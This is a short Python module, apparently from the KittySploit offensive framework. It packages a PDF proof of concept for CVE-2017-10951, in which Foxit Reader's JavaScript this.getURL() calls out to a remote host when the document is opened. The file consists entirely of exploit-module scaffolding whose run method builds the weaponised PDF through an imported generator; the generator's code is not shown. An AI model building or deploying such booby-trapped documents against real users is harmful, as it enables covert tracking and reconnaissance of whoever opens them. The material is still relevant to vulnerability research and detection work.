#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.pdf.mixins import PdfCveMixin
from lib.pdf.generators.javascript import write_foxit_geturl_js


class Module(Auxiliary, PdfCveMixin):
    __info__ = {
        "name": 'PDF CVE-2017-10951 Foxit getURL Callback',
        "description": 'Generate PDF PoC for CVE-2017-10951: Foxit Reader JavaScript this.getURL() phone-home on document open.',
        "author": ["KittySploit Team"],
        "cve": ['CVE-2017-10951'],
        "references": ['https://twitter.com/l33d0hyun/status/1448342241647366152'],
        "tags": ['pdf', 'cve-2017-10951', 'foxit', 'javascript'],
    }

    PDF_GENERATORS = (
        write_foxit_geturl_js,
    )

    CVE_IDS = ['CVE-2017-10951']
    MODULE_TITLE = 'PDF CVE-2017-10951 Foxit getURL Callback'

    def run(self):
        return self.run_pdf_cve()